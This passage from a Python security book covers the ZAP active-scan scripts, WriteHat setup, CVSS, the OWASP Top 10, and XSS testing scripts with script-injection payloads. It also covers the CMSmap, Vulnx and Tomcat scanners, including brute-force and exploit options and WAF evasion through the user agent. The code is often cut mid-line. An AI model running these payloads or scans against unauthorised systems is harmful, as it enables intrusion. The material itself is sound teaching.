print('Spidering target {}'.format(target)) 
scanid = zap.spider.scan(target) 
time.sleep(2) 
while (int(zap.spider.status(scanid)) < 100): 
    print('Spider progress %: {}'.format(zap.spider
    time.sleep(2) 
while (int(zap.pscan.records_to_scan) > 0): 
    print ('Records to passive scan : {}'.format(zap
    time.sleep(2) 
with open("report.html", "w") as report_file:report_
print('Passive Scan completed') 
print('Hosts: {}'.format(', '.join(zap.core.hosts)))
print('Alerts: ') 
print(zap.core.alerts()) 

Finally, we could execute an active scan with the method
zap.ascan.scan(target), which starts the active scan process.
Once the active scan API is called, waits for the process to complete
by querying the scan progress using the status() method. You can
ﬁnd the following code in the active_scan.py ﬁle:
In the previous code, the active scan is complete when status equals
100 and performs a wide range of aĴacks for detecting diﬀerent
types of vulnerabilities that are deﬁned in the Policy tab inside the
Active Scan window.
import time 
from zapv2 import ZAPv2 
apiKey='<YOUR_API_KEY>' 
target = 'http://testphp.vulnweb.com/' 
zap = ZAPv2(apikey=apiKey) 
print('Accessing target {}'.format(target)) 
zap.urlopen(target) 
time.sleep(2) 
print('Active Scanning target {}'.format(target)) 
scanID = zap.ascan.scan(target) 
while int(zap.ascan.status(scanID)) < 100: 
    print('Scan progress %: {}'.format(zap.ascan.sta
    time.sleep(5) 
print('Active Scan completed') 
with open("report.html", "w") as report_file:report_
print('Hosts: {}'.format(', '.join(zap.core.hosts)))
print('Alerts: ') 
print(zap.core.alerts(baseurl=target)) 

Figure 9.25: OWASP ZAP Active Scan | Policy
During the active scan process, we can see the scan status in the
OWASP ZAP interface and detect what the URLs the spider is
processing are.

Figure 9.26: OWASP ZAP active scan process
After the spider and scans are complete, you can use the method
zap.core.htmlreport() to generate a report.

Figure 9.27: OWASP ZAP scanning report
It’s important to mention that active scanning is a real aĴack on
those targets and can put the targets at risk, so it’s recommended not
to use active scanning against targets you do not have permission to
test.
WriteHat as a pentesting reports
tool

WriteHat is a reporting tool developed in the Django web
framework that provides some components to present beautiful
reports for penetration/red/blue/purple team engagements. You can
ﬁnd the source code in the GitHub repository:
https://github.com/blacklanternsecurity/writehat.
The fastest way to install this tool is by using Docker and docker-
compose, which we can install with the following command:
$ sudo apt install docker.io docker-compose 
You can deploy WriteHat with the following commands:
The previous command will deploy the application using the
following docker-compose.yml ﬁle:
$ git clone https://github.com/blacklanternsecurity/
$ cd writehat 
$ sudo chmod -R 777 /writehat/static 
$ docker-compose up 
version: '3.7'
services: 
  nginx: 
    image: nginx 
    volumes: 
      - ./nginx:/opt/writehat/nginx 
      - ./writehat/config/nginx.conf:/etc/nginx/conf
      - ./writehat/static:/opt/writehat/static 

    ports: 
      - 80:80 
      - 443:443 
    restart: unless-stopped 
    depends_on: 
      - writehat 
  writehat: 
    build: 
      context: . 
      dockerfile: ./writehat/config/Dockerfile.app 
    command: bash -c "
      sleep 2 &&
      ./manage.py makemigrations writehat &&
      ./manage.py migrate writehat &&
      ./manage.py makemigrations &&
      ./manage.py migrate &&
      uwsgi --socket 0.0.0.0:8000 --plugin-dir=/usr/
    volumes: 
      - .:/opt/writehat 
    expose: 
      - 8000 
    restart: unless-stopped 
    depends_on: 
      - mongo 
      - mysql 
  mongo: 
    image: mongo:4.4 
    volumes: 
      - ./mongo/configdb:/data/configdb 
      - ./mongo/db:/data/db 
    environment: 
      - MONGO_INITDB_ROOT_USERNAME=root 

We could start creating an engagement that is where content is
created for a customer. An engagement is an overarching container
that will hold reports and ﬁndings.
      - MONGO_INITDB_ROOT_PASSWORD=FORTHELOVEOFGEEBU
    expose: 
      - 27017 
  mysql: 
    image: mysql:5 
    volumes: 
      - ./mysql:/var/lib/mysql 
    environment: 
      MYSQL_ROOT_PASSWORD: CHANGETHISIFYOUAREANINTEL
      MYSQL_DATABASE: writehat 
      MYSQL_USER: writehat 
      MYSQL_PASSWORD: CHANGETHISIFYOUAREANINTELLIGEN
    expose: 
      - 3306 
    restart: unless-stopped 
  chrome: 
    image: selenium/standalone-chrome:latest 
    expose: 
      - 4444 
    depends_on: 
      - writehat

Figure 9.28: Creating an engagement
We could continue creating a report template that contains the
components we are going to use to generate the report.
Figure 9.29: Creating a report template

We could continue creating a collection of ﬁndings that are scored in
the same way (CVSS or DREAD). At this point, we could create
several ﬁndings per engagement.
Figure 9.30: Search Findings Database
When creating a new ﬁnding, you have the possibility to select the
level of criticality for each of the characteristics, among which we
can highlight: AĴack Vector, AĴack Complexity, Privileges
Required, User Interaction, Scope, Conﬁdentiality, Integrity,
Availability, Exploit Code Maturity, Remediation Level, Report
Conﬁdence, Conﬁdentiality Requirement, and Integrity
Requirement.

Figure 9.31: Creating a new ﬁnding
In the following screenshot, we can see the details of the AĴack
Vector feature:

Figure 9.32: AĴack Vector feature
At this point, our objective would be to select, for each feature, the
level of criticality for the vulnerability we have detected. The
Common Vulnerability Scoring System, or CVSS, is a scoring
system that allows the severity level of a security ﬂaw to be deﬁned
numerically. This tells researchers how damaging it is to exploit the
vulnerability. For an aĴacker, high vulnerability scores mean an
opportunity to seriously harm a target.

For an ethical hacker, the base score indicates how alarming the
characteristics of a vulnerability are.
Figure 9.33: CVSS risk diagram
To obtain the CVSS value, there are sets of base metrics to determine
the CVSS of a vulnerability. There are also CVSS calculators that
apply these metrics to represent the risk of a security ﬂaw.
The National Vulnerability Database calculator,
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator, is
a standard tool for calculating the CVSS of a security ﬂaw.

Figure 9.34: Common Vulnerability Scoring System Calculator
In this calculator, you can ﬁnd several diﬀerent variables that you
can ﬁll in with information to ﬁnd the CVSS of the vulnerability. A
high CVSS score implies a high-risk security ﬂaw, while a low CVSS
score means a moderate threat level. The higher the CVSS score, the
more urgency there is to ﬁx the ﬂaw and the greater the potential for
harm to a system or company for the cybercriminal exploiting the
system.
Summary
In this chapter, we learned about the OpenVAS and OWASP ZAP
vulnerability scanners and the reporting tools that they give us for
reporting the vulnerabilities that we ﬁnd in the servers and web
applications we scan. Also, we covered how to use these scanners

programmatically with Python, with the python-gvm and owasp-
zap modules.
The tools we covered in this chapter use diﬀerent protocols to
generate requests to determine which services are running on a
remote host or on the host itself. Therefore, equipped with these
tools, you can now identify diﬀerent security risks in both one
system and various systems on a network.
In the next chapter, we will identify server vulnerabilities in web
applications with tools such as WPScan, which discovers
vulnerabilities in and analyzes the security of WordPress sites, and
other tools like SQLInject-Finder and Sqlmap, which detect SQL
injection vulnerabilities in websites.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. What is the name of the class from the python-gmv module that
allows us to connect to the OpenVAS vulnerability scanner?
2. What is the name of the method from the python-gmv module
that allows us to authenticate to the OpenVAS vulnerability
scanner?
3. Which method in the owasp_zap module can you use to scan a
speciﬁc target?
4. Which method in the owasp_zap module allows you to get a
report once the scanning process is completed?

5. What is the name of the method in the owasp_zap module for
executing an active scan?
Further reading
Use the following links to ﬁnd more information about the
mentioned tools, along with some other tools related to the
OpenVAS vulnerability scanners:
Greenbone Community Edition documentation:
https://greenbone.github.io/docs/latest
Greenbone Vulnerability Management Python Library:
https://greenbone.github.io/python-gvm
OWASP ZAP API documentation:
https://www.zaproxy.org/docs/api
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

10
Interacting with Server
Vulnerabilities in Web
Applications
In this chapter, we will learn about the main vulnerabilities in web
applications. We will also learn about the tools we can ﬁnd in the
Python ecosystem for discovering vulnerabilities in Content
Management System (CMS) web applications and sqlmap for
detecting SQL vulnerabilities. In terms of server vulnerabilities, we
will cover testing Tomcat servers and the process of detecting
vulnerabilities in web applications with tools like nmap and
Fuxploider.
From a security point of view, it is important to identify server
vulnerabilities because applications and services are continually
changing, and any unpatched security issue can be exploited by an
aĴacker who aims to exploit vulnerabilities that have not been
initially identiﬁed. At this point, it is important to note that not all
security vulnerabilities can be ﬁxed with a patch. In some cases, it’s a
ﬂaw in a library or the operating system may require additional
controls or reshifting of infrastructure, which is not easy to solve.
The following topics will be covered in this chapter:

Understanding vulnerabilities in web applications with OWASP
Analyzing and discovering vulnerabilities in CMS web
applications
Discovering vulnerabilities in Tomcat server applications
Discovering SQL vulnerabilities with Python tools
Automating the process of detecting vulnerabilities in web
applications
Technical requirements
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
This chapter requires the installation of speciﬁc tools for discovering
vulnerabilities in web applications. You can use your operating
system’s package management tool to install them.
One of the main tools for detecting SQL vulnerabilities is SQLmap,
which can be installed in a Debian-based Linux operating system
using the following command:
$ sudo apt-get install sqlmap 
For readers that are using other operating systems such as Windows
or macOS, we encourage reading the individual READMEs in the
oﬃcial documentation, https://sqlmap.org, and the oﬃcial
GitHub repository, https://github.com/sqlmapproject/sqlmap.

Check out the following video to see the Code in Action:
https://packt.link/Chapter10.
Understanding vulnerabilities in
web applications with OWASP
In this section, we will review the OWASP Top 10 vulnerability list
and explain the Cross-Site Scripting (XSS) vulnerability in detail.
A vulnerability is a weakness in an information system that can be
exploited by a threat actor. This weakness can present itself for a
variety of reasons, such as failures in the design phase or errors in
the programming logic.
The OWASP project aims to create knowledge, techniques, and
processes designed to protect web applications against possible
aĴacks. This project is made up of a series of subprojects, all focused
on the creation of knowledge and security material for web
applications.
One of these subprojects is the OWASP Top 10 project, where the 10
most important risks at the web application level are deﬁned and
detailed. This list is updated with the diﬀerent techniques and
vulnerabilities that can expose security risks in web applications.
Among the 10 most important and common vulnerabilities in web
applications of the 2021 updated version of the OWASP Top 10
project, https://owasp.org/Top10/en/, we can highlight the
following:

Command injection: Command injection is one of the most
common aĴacks in web applications in which the aĴacker
exploits a vulnerability in the system to execute SQL, NoSQL, or
LDAP commands to access data in an unauthorized manner.
This vulnerability occurs because the application is not
validating or ﬁltering user input. We can ﬁnd more information
about this kind of vulnerability in the OWASP documentation at
https://owasp.org/Top10/en/A03_2021-Injection.
XSS: This vulnerability allows an aĴacker to execute arbitrary
JavaScript code. The criticality of these vulnerabilities depends
on the type of XSS and the information stored on the web page.
We can generally talk about three types of XSS:
a. XSS Persistent or Stored, where the application stores data
provided by the user without validation that is later viewed
by another user or an administrator. The JavaScript code we
insert will be stored in the database so that every time a
user views that page, the code will be executed.
b. Reﬂected XSS, where the application uses raw data,
supplied by a user and encoded as part of the output
HTML or JavaScript. The JavaScript code will only be
executed when the target user executes a speciﬁc URL
created or wriĴen by the aĴacker. The aĴacker will
manipulate a URL, which they will send to their target, and
when the target executes or opens that URL, the code will
be executed.
c. XSS DOM, where the application processes the data
controlled by the user in an insecure way. An example of
this aĴack can be found in the URL of a website where we

write JavaScript code and the web uses an internal script
that inserts the URL without validation into the HTML
code returned to the user. The exploitation of this type of
vulnerability involves executing commands in the victim’s
browser to steal their credentials, hijack sessions, install
malicious software on the victim’s computer, or redirect
them to malicious sites.
Cross-Site Request Forgery (XSRF/CSRF): This aĴack is based
on aĴacking a service by reusing the user’s credentials from
another website. A typical CSRF aĴack happens with POST
requests. For instance, you could have a malicious website
displaying a link to a user to trick that user into performing a
POST request on your site using their existing credentials. A
CSRF aĴack forces the browser of an authenticated victim to
send a spoofed HTTP request, including the user’s session
cookies and any other automatically included authentication
information, to a vulnerable web application. This allows the
aĴacker to force the victim’s browser to generate requests that
the vulnerable application interprets as legitimate.
Sensitive data exposure: Many web applications do not
adequately protect sensitive data, such as credit card numbers
or authentication credentials. Sensitive data requires additional
protection methods, such as data encryption, when exchanging
data with the browser. We can ﬁnd more information about this
kind of vulnerability in the OWASP documentation at
https://owasp.org/Top10/en/A02_2021-
Cryptographic_Failures.

Unvalidated redirects and forwards: AĴackers may redirect
victims to phishing or malware sites or use forwarding to reach
unauthorized pages without proper validation.
One of the best lists of popular vulnerability scanners is maintained
by OWASP at https://owasp.org/www-
community/Vulnerability_Scanning_Tools. These vulnerability
scanners have the capacity to automate security auditing and scan
your network and websites for diﬀerent security risks following
OWASP best practices.
The website http://www.vulnweb.com, provided by acunetix,
oﬀers a few links to some of the mentioned vulnerabilities, where
each site is made up of diﬀerent technologies on the backend. In the
following screenshot, we can see the sites that the acunetix service
provides:

Figure 10.1: Vulnerable test websites
Next, we are going to analyze vulnerabilities, including XSS and
SQL injection, and how we can extend open-source tooling with
Python to detect them.

Testing Cross-Site Scripting (XSS)
vulnerabilities
XSS is a vulnerability that allows an aĴacker to inject JavaScript code
into a website page. As JavaScript is a language that runs in the
client’s browser, when we execute this code, we are doing so on the
client side. AĴacks are mainly caused by incorrectly validating user
data and are usually injected via a web form or an altered link. On
the following page, we can ﬁnd other ways to produce this type of
aĴack: https://owasp.org/www-community/attacks/xss.
If an aĴacker can inject JavaScript into the output of a web
application and execute it, they will be able to execute any JavaScript
code in a user’s browser. This vulnerability allows aĴackers to
execute scripts in the victim’s browser, hijacking user sessions or
redirecting the user to a malicious website. Examples of XSS aĴacks
include stealing cookies and user sessions, modifying the website,
doing HTTP requests with the user session, redirecting users to
malicious websites, aĴacking the browser or installing malware, and
rewriting or manipulating browser extensions. To test whether a
website is vulnerable to XSS, we could use the following script,
where we read from an XSS-attack-vectors.txt ﬁle that contains
all possible aĴack vectors:
<SCRIPT>alert('XSS');</SCRIPT> 
<script>alert('XSS');</script> 
<BODY ONLOAD=alert('XSS')> 
<SCR%00IPT>alert(\'XSS\')</SCR%00IPT> 

You can ﬁnd a similar ﬁle example in the fuzzdb project’s GitHub
repository:
https://github.com/fuzzdb-
project/fuzzdb/tree/master/attack/xss
Since this type of web vulnerability is exploited in user inputs and
forms, as a result, we need to ﬁll out any form we see with some
JavaScript code. In the following example, we are using this
technique to detect this vulnerability. You can ﬁnd the following
code in the scan_xss_website.py ﬁle in the XSS folder:
import requests 
from pprint import pprint 
from bs4 import BeautifulSoup as bs 
from urllib.parse import urljoin 
def get_all_forms(url): 
    soup = bs(requests.get(url).content, "html.parse
    return soup.find_all("form")   
def get_form_details(form): 
    form_details = {} 
    action = form.attrs.get("action", "").lower() 
    method = form.attrs.get("method", "get").lower()
    inputs = [] 
    for input_tag in form.find_all("input"): 
        input_type = input_tag.attrs.get("type", "te
        input_name = input_tag.attrs.get("name") 
        inputs.append({"type": input_type, "name": i
    form_details["action"] = action 
    form_details["method"] = method 

In the previous code, we are using two methods. The
get_all_forms(url) method, given a URL, returns all forms from
the HTML content, and the get_form_details(form) method
extracts all possible useful information about an HTML form.
We can continue by implementing the
submit_form(form_details, url, value) method, which
submits a form and returns the HTTP response after form
submission. Finally, the scan_xss(url) method prints all XSS-
vulnerable forms and returns True if any are vulnerable, and False
otherwise:
    form_details["inputs"] = inputs 
    return form_details 
def submit_form(form_details, url, value): 
    target_url = urljoin(url, form_details["action"]
    inputs = form_details["inputs"] 
    data = {} 
    for input in inputs: 
        if input["type"] == "text" or input["type"] 
            input["value"] = value 
        input_name = input.get("name") 
        input_value = input.get("value") 
        if input_name and input_value: 
            data[input_name] = input_value 
    print(f"[+] Submitting malicious payload to {tar
    print(f"[+] Data: {data}") 
    if form_details["method"] == "post": 
        return requests.post(target_url, data=data) 

By executing the above script, we see how it detects the forms on the
page and returns whether the page is vulnerable when the payload
aĴempts to exploit the vulnerability.
    else: 
         return requests.get(target_url, params=data
def scan_xss(url): 
    is_vulnerable = False 
    forms = get_all_forms(url) 
    print(f"[+] Detected {len(forms)} forms on {url}
    js_script = "<script>alert('testing xss')</scrip
    for form in forms: 
        form_details = get_form_details(form) 
        content = submit_form(form_details, url, js_
        if js_script in content: 
            print(f"[+] XSS Detected on {url}") 
            print(f"[*] Form details:") 
            pprint(form_details) 
            is_vulnerable = True 
        return is_vulnerable 
if __name__ == "__main__": 
    url = "http://testphp.vulnweb.com/cart.php" 
    if scan_xss(url): 
        print("The website is XSS vulnerable") 
$ python scan_xss_website.py  
[+] Detected 1 forms on http://testphp.vulnweb.com/c
[+] Data: {'searchFor': "<script>alert('testing xss
[+] XSS Detected on http://testphp.vulnweb.com/cart
[*] Form details: 

As a result of executing the preceding script, for each payload we are
testing in the request, we obtain the same payload in the response.
We can check the vulnerability on the
http://testphp.vulnweb.com site:
Figure 10.2: The XSS-vulnerable website
This is a type of injection aĴack that occurs when aĴack vectors are
injected in the form of a browser-side script. The browser will reﬂect
{'action': 'search.php?test=query', 
'inputs': [{'name': 'searchFor', 
             'type': 'text', 
             'value': "<script>alert('testing xss')<
            {'name': 'goButton', 'type': 'submit'}],
'method': 'post'} 
The website is XSS vulnerable 

a dialog box back to the user if they input scripts tags within the
search ﬁelds of the vulnerable website:
Figure 10.3: Reﬂected XSS-vulnerable website
In the following example, we are using the same technique to detect
vulnerable parameters. You can ﬁnd the following code in the
testing_xss_payloads.py ﬁle in the XSS folder:
import requests 
import sys 
url = "http://testphp.vulnweb.com/listproducts.php?c
initial = "'" 
xss_injection_payloads = ["<SCRIPT>alert('XSS');</SC
response = requests.get(url+initial) 
if "MySQL" in response.text or "You have an error in
    print("site vulnerable to sql injection") 
    for payload in xss_injection_payloads: 
        response = requests.get(url+payload) 
        if payload in response.text: 
            print("The parameter is vulnerable") 

In the preceding code, we are testing whether the page is vulnerable
to SQL injection and we are using speciﬁc payloads to detect an XSS
vulnerability on the
http://testphp.vulnweb.com/listproducts.php?cat= website.
In the website analyzed, we have detected the
presence of an error message that provides
information related to SQL injection: 'Error: You
have an error in your SQL syntax; check the
manual that corresponds to your MySQL server
version for the right syntax to use near ''
at line 1 Warning: mysql_fetch_array()
expects parameter 1 to be resource,boolean
given in /hj/var/www/listproducts.php on
line 74'.
Next, we are going to request the same website with speciﬁc XSS
payloads using the vulnerable cat parameter that is found in the
query string in the URL:
$ sudo python3 testing_xss_payloads.py 
site vulnerable to sql injection 
The parameter is vulnerable 
Payload string: <SCRIPT>alert('XSS');</SCRIPT> 
... 
            print("Payload string: "+payload+"\n") 
            print(response.text) 

In the preceding partial output, it is established that the cat
parameter is vulnerable to the <SCRIPT>alert('XSS');</SCRIPT>
payload. At this point, we can highlight the fact that both
vulnerabilities aim to exploit inputs that are not validated or ﬁltered
by the user.
Another way to check if a website may be aﬀected by this
vulnerability is to use automated tools such as PwnXSS.
PwnXSS (https://github.com/pwn0sec/PwnXSS) is a free and
open-source tool available on GitHub that is specially designed to
ﬁnd cross-site scripting vulnerabilities in a website. We can
download the tool and give permissions with the following
commands:
$ git clone https://github.com/pwn0sec/PwnXSS 
$ chmod 755 -R PwnXSS 
You can use the following command to see the help index of the tool.
$ python3 pwnxss.py --help 
usage: PwnXSS -u <target> [options] 
Options: 
  --help            Show usage and help parameters 
  -u                Target url (e.g. http://testphp
  --depth           Depth web page to crawl. Default
  --payload-level   Level for payload Generator, 7 f
  --payload         Load custom payload directly (e
  --method          Method setting(s):  

The previous tool starts checking for cross-site scripting
vulnerabilities and continues checking the website when a
vulnerable website is found, showing the information on the
terminal.
Once this analysis has been carried out, we can conclude that
JavaScript components that are not correctly validating user input
are one of the easiest targets for aĴackers to obtain user information.
                     
0: GET 
                     
1: POST 
                     
2: GET and POST (default) 
  --user-agent      Request user agent (e.g. Chrome/
  --single          Single scan. No crawling just on
  --proxy           Set proxy (e.g. {'https':'https
  --about           Print information about PwnXSS t
  --cookie          Set cookie (e.g {'ID':'109420054
 Github: https://www.github.com/pwn0sec/PwnXSS 
$ python3 pwnxss.py -u http://testphp.vulnweb.com 
[14:13:39] [INFO] Starting PwnXSS... 
*************** 
[14:13:39] [INFO] Checking connection to: http://tes
[14:13:39] [INFO] Connection estabilished 200 
[14:13:39] [WARNING] Target have form with POST meth
[14:13:39] [INFO] Collecting form input key..... 
[14:13:39] [INFO] Form key name: searchFor value: <s
[14:13:39] [INFO] Form key name: goButton value: <Su
[14:13:39] [INFO] Sending payload (POST) method... 
[14:13:39] [CRITICAL] Detected XSS (POST) at http://
[14:13:39] [CRITICAL] Post data: {'searchFor': '<scr

Now that we have analyzed the XSS vulnerability in detail, we are
going to review how to discover vulnerabilities in CMS web
applications speciﬁcally.
Analyzing and discovering
vulnerabilities in CMS web
applications
In this section, we will cover some of the tools that can be used to
discover vulnerabilities in CMS web applications such as WordPress
and Joomla.
For example, we might be interested in determining the type of CMS
as well as the vulnerabilities at the administrative interface level
relative to users and groups that are conﬁgured.
CMSs have become an especially tempting target for aĴackers due to
their growth and large presence on the internet.
The ease with which a website can be created without any technical
knowledge leads many companies and individuals to use
applications with numerous vulnerabilities due to the use of
outdated plugins and poor conﬁgurations on the server where they
are hosted. CMSs also include third-party plugins to facilitate tasks
such as login and session management and searches, and some
include shopping cart modules. The main problem is that we can
usually ﬁnd security issues related to these plugins.
For example, WordPress websites are usually administered by users
who aren’t security experts, and they don’t usually update their

WordPress modules and plugins, making these sites an aĴractive
target for aĴackers.
In addition to having an updated version of WordPress and third-
party functionality plugins, the conﬁguration of the web server that
hosts the application is just as important to guarantee the security of
the web against aĴackers.
We have seen just how vulnerable CMS web applications can be.
Now, we are going to review the main tools for detecting
vulnerabilities in them.
Using CMSmap
One of the most popular vulnerability scanners for CMS applications
is CMSmap (https://github.com/Dionach/CMSmap). This tool is
an open-source Python scanner that automates the process of
detecting security issues in popular CMSs. This tool also uses the
Exploit Database (https://www.exploit-db.com) to look for
vulnerabilities in CMS-enabled plugins.
This tool has the capacity to identify the version number of the CMS
in WordPress sites and detect known vulnerabilities in installed
plugins and then match them against a database in order to identify
possible security risks.
We can download the tool and run the command from anywhere in
our system with the following commands:
$ git clone https://github.com/Dionach/CMSmap 
$ cd CMSmap 

$ pip install . 
For example, we could execute a full scan of a website running the
WordPress CMS:
In the preceding output, we can see how CMSmap displays the
vulnerabilities it ﬁnds preceded by an indicator of the severity
rating: [I] for informational, [L] for low, [M] for medium, and
[H] for high. So, what the script does is detect WordPress ﬁles by
default and look for certain directories:
$ python cmsmap.py -F http://www.wordpress.com 
[I] Threads: 5 
[-] Target: http://www.wordpress.com (192.0.78.12) 
[M] Website Not in HTTPS: http://www.wordpress.com 
[I] Server: nginx 
[L] X-Frame-Options: Not Enforced 
[I] X-Content-Security-Policy: Not Enforced 
[I] X-Content-Type-Options: Not Enforced 
[L] Robots.txt Found: http://www.wordpress.com/robot
[I] CMS Detection: WordPress 
[I] WordPress Theme: h4 
[M]  EDB-ID: 11458 'WordPress Plugin Copperleaf Phot
[M]  EDB-ID: 39536 'WordPress Theme SiteMile Project
... 
[-] Default WordPress Files: 
[I] http://www.wordpress.com/wp-content/themes/twent
[I] http://www.wordpress.com/wp-content/themes/twent

The -a parameter of CMSmap will allow us to specify a custom user
agent:
$ python3 cmsmap.py -a 'user_agent' <domain> 
The user agent option can be interesting if the website we are
analyzing is behind a Web Application Firewall (WAF) that is
blocking CMS scanning apps. The idea behind deﬁning a custom
user agent is to prevent the WAF from blocking requests, making it
believe that the request is emanating from a speciﬁc browser.
In addition to detecting vulnerabilities, CMSmap can list the plugins
that are installed on a certain site, as well as run a brute-force
process using a username and password ﬁle. For this task, we could
use the following options:
[I] http://www.wordpress.com/wp-includes/ID3/license
[I] http://www.wordpress.com/wp-includes/ID3/license
[I] http://www.wordpress.com/wp-includes/ID3/readme
[I] http://www.wordpress.com/wp-includes/images/crys
[I] http://www.wordpress.com/wp-includes/js/plupload
[I] http://www.wordpress.com/wp-includes/js/tinymce/
[-] Checking interesting directories/files ... 
[L] http://www.wordpress.com/help.txt               
[L] http://www.wordpress.com/menu.txt 
.... 
Brute-Force: 
  -u , --usr            username or username file 

With this tool, we have seen how we can execute the initial stage of a
pentesting process in order to obtain a global vision of the security of
the site we are analyzing.
Within the Python ecosystem, we ﬁnd other tools that work in a
similar way. Some are specialized in analyzing sites based on CMS
technologies, among which we can highlight Vulnx.
Vulnx as a CMS scanner
Vulnx (https://github.com/anouarbensaad/vulnx) is an
intelligent Auto Shell Injector tool that has the capacity to detect and
exploit vulnerabilities in multiple types of CMSs, such as WordPress,
Joomla, and Drupal.
We can download the tool and give permissions with the following
commands:
  -p , --psw            password or password file 
  -x, --noxmlrpc        brute forcing WordPress with
$ git clone https://github.com/anouarbensaad/vulnx 
$ chmod 755 -R vulnxInstead of injecting a shell man
usage: vulnx.py [-h] [-u URL] [-D DORKS] [-o OUTPUT]
                [-p SCANPORTS] [-e] [--it] [--cms] 
 OPTIONS: 
  -h, --help            show this help message and e
  -u URL, --url URL     url target to scan 
  -D DORKS, --dorks DORKS 
                        search webs with dorks 

With the following command, we can get information and scan a
website.
Now that we have analyzed the main tools for discovering
vulnerabilities in CMS web applications, we are going to review how
to discover vulnerabilities in Tomcat server applications.
  -o OUTPUT, --output OUTPUT 
                        specify output directory 
  -n NUMBERPAGE, --number-pages NUMBERPAGE 
                        search dorks number page lim
  -i INPUT_FILE, --input INPUT_FILE 
                        specify input file of domain
  -l {wordpress,prestashop,joomla,lokomedia,drupal,a
                        list names of dorks exploits
  -p SCANPORTS, --ports SCANPORTS 
                        ports to scan 
  -e, --exploit         searching vulnerability & ru
  --it                  interactive mode. 
  --cms                 search cms info[themes,plugi
  -w, --web-info        web informations gathering 
  -d, --domain-info     subdomains informations gath
  --dns                 dns informations gatherings 
$ python vulnx.py --cms -w -d --exploit -u <domain> 

Discovering vulnerabilities in
Tomcat server applications
In this section, we will learn how to install the Apache Tomcat server
and test the server installation with the ApacheTomcatScanner tool.
Installing the Tomcat server
Apache Tomcat is a servlet container used as a reference
implementation of Java servlet and Java Server Pages (JSP)
technologies. First, we verify that we have Java installed on our
computer.
After geĴing the JDK, you can download the last version from the
project’s oﬃcial site, https://tomcat.apache.org/download-
10.cgi. You can now extract the downloaded Tomcat using the
following command:
$ tar xvzf apache-tomcat-10.0.27.tar.gz 
Now, you can start the Tomcat server by executing the following
script located in the folder created with the previous extraction from
the tar.gz ﬁle.
$ java -version 
openjdk version "11.0.15" 2022-04-19 
OpenJDK Runtime Environment (build 11.0.15+10) 
OpenJDK 64-Bit Server VM (build 11.0.15+10, mixed mo

You can observe the Tomcat server has been started. After that, you
can access the web interface of Tomcat by using the
http://localhost:8080 address using your browser.
Testing the Tomcat server with
ApacheTomcatScanner
Once the server installation is done, we can analyze the security of
the server using tools such as ApacheTomcatScanner. This is a
Python script to scan for Apache Tomcat server vulnerabilities. You
can download the source code from the GitHub repository:
https://github.com/p0dalirius/ApacheTomcatScanner. Also,
you can install it from PyPI with the following command:
$ python3 -m pip install apachetomcatscanner 
With the -h option, we can see the options oﬀered by the tool.
$ ./startup.sh 
Using CATALINA_BASE:   /home/linux/Downloads/apache-
Using CATALINA_HOME:   /home/linux/ Downloads /apach
Using CATALINA_TMPDIR: /home/linux/ Downloads /apach
Using JRE_HOME:        /usr 
Using CLASSPATH:       /home/linux/ Downloads /apach
Using CATALINA_OPTS:    
Tomcat started. 

Next, we can execute the script that allows us to analyze the security
of the Tomcat server with the possibility to list the CVEs with the --
list-cves option:
$ python ApacheTomcatScanner.py -h 
Apache Tomcat Scanner v2.3.2 - by @podalirius_ 
usage: ApacheTomcatScanner.py [-h] [-v] [--debug] [-
                              [-tt TARGET] [-tp TARG
A python script to scan for Apache Tomcat server vul
optional arguments: 
  -h, --help            show this help message and e
  -v, --verbose         Verbose mode. (default: Fals
  --debug               Debug mode, for huge verbosi
  -C, --list-cves       List CVE ids affecting each 
  -T THREADS, --threads THREADS 
                        Number of threads (default: 
  -s, --servers-only    If querying ActiveDirectory,
  --only-http           Scan only with HTTP scheme. 
  --only-https          Scan only with HTTPs scheme
$ python ApacheTomcatScanner.py -v -tt 127.0.0.1 -tp
Apache Tomcat Scanner v3.0 - by @podalirius_ 
[+] Targeting 1 ports on 1 targets 
[+] Searching for Apache Tomcats servers on specifie
[2023/02/21 22h18m53s] Status (0/1)  0.00 % | Rate 0
  | Valid user: both | password:tomcat | Default acc
  | Valid user: role1 | password:tomcat | Default ac
 [+] All done! 

In the output of the script execution, we see how it detects the
version of the Apache Tomcat server, and when the manager is
available, it can obtain the users and passwords established by
default to access the server. At this point, it is recommended to
review the server conﬁguration found in the path apache-tomcat-
10.0.27/conf and modify the default users and passwords to
avoid exposing the server to possible aĴackers.
We’ll continue with the process of ﬁnding vulnerable Tomcat servers
using other tools and techniques.
Finding vulnerable Tomcat servers in
the Censys search engine
One of the fastest ways we can get the vulnerabilities of a server
such as Tomcat is to use the CVE vulnerabilities database. Using the
following service, we can search for vulnerabilities that aﬀect this
server:
https://cve.mitre.org/cgi-bin/cvekey.cgi?
keyword=apache+tomcat

Figure 10.4: CVE records for Apache Tomcat server
As we can see in the previous screenshot, CVE-2022-45143 is a
security vulnerability that aﬀects certain versions of the Apache
Tomcat servlet container. The vulnerability is related to the way the
JsonErrorReportValve class in the Tomcat container processes
JSON data. An aĴacker could exploit this vulnerability by sending a
specially crafted JSON request to a vulnerable Tomcat server.
This could allow the aĴacker to execute arbitrary code on the server,
potentially leading to a complete compromise of the system. This
vulnerability aﬀects Apache Tomcat versions 8.5.83, 9.0.40 to 9.0.68,
and 10.1.0-M1 to 10.1.1. You can get more information about this
vulnerability from the NVD database:
https://nvd.nist.gov/vuln/detail/CVE-2022-45143.

We can also use the Censys search engine
(https://search.censys.io), which allows us to perform searches
in order to obtain information about hosts and servers that we can
ﬁnd on the internet. For example, we could use this tool to identify a
Tomcat server that may be vulnerable.
If we perform the Apache Tomcat 8.5.83 query, the Censys service
returns the following results, where we can highlight the Hosts
section:
Figure 10.5: Censys results for the Apache Tomcat query
Once we have searched for machines that have this version of
Apache Tomcat, we could use nmap and Python to check if this

server has any of the most critical vulnerabilities that we can ﬁnd for
this server.
Scanning vulnerabilities with the Nmap
port scanner
Nmap provides a speciﬁc script that does a great job of detecting
vulnerable servers. The script is available in the following repository:
https://github.com/vulnersCom/nmap-vulners. The source
code is available at https://github.com/vulnersCom/nmap-
vulners/blob/master/vulners.nse.
You can execute the following command over port 8080 to discover
vulnerabilities in the Tomcat server:
